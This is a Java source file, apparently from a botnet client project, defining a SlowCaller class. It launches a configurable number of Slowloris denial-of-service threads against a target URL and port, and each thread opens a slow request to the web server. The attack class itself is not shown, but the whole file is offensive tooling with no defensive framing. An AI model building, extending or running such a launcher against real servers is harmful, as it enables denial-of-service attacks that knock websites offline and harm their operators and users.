package com.example.botclient.slowloris;

import java.net.MalformedURLException;

public class SlowCaller
{
    private int port;
    private int threads;
    private int timer;
    private String target; //should be a URL

    public SlowCaller(){}

    public SlowCaller (String target, int port, int threads, int timer)
    {
        this.target = target;
        this.port = port;
        this.threads = threads;
        this.timer = timer;
    }

    public void caller()
    {
        System.out.println("Starting SlowLoris.............");

        for(int i = 0; i < threads; i++) //for each thread
        {
            try
            {
                SlowLoris loris = new SlowLoris(target, port, timer); //creates a new SlowLoris object = a new request to the web server
                loris.execute();
            }
            catch(MalformedURLException mue)
            {
                die(mue.getMessage()); // fatal error
            }
        }
    }


    /**
     * prints an error message and exits the program
     * @param deathMsg msg that indicates the cause of the fatal error
     */
    private static void die(String deathMsg)
    {
        System.err.println(deathMsg);
        System.exit(-1);
    }
}
